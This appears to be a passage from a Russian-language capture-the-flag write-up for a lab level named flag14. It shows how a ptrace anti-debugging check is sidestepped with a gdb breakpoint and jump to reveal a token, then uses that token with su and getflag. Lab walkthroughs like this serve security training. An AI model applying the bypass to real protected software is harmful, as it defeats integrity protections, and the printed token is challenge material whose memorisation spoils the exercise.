Строка ниже не позволит взаимодействовать с программой через дебагер: \
   0x08048989 <+67>:    call   0x8048540 <ptrace@plt>                 \
"при трассировке программы с setuid битом, этот самый бит не работает — привилегии не повышаются."                                                          \
https://habr.com/ru/post/111266/                                      \
Значит, необходимо сделать точку остановки и прыжок до нее:
```sh
#  0x08048982 <+60>:    movl   $0x0,(%esp)
b *0x08048982
# ||
# \/
# Breakpoint 1 at 0x8048982

run

jump *0x08048de5
# ||
# \/
# Continuing at 0x8048de5.
# 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
# [Inferior 1 (process 27325) exited normally]
```

Последний шаг:
```sh
su flag14 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
# ||
# \/
# Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)

getflag
# ||
# \/
# Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```
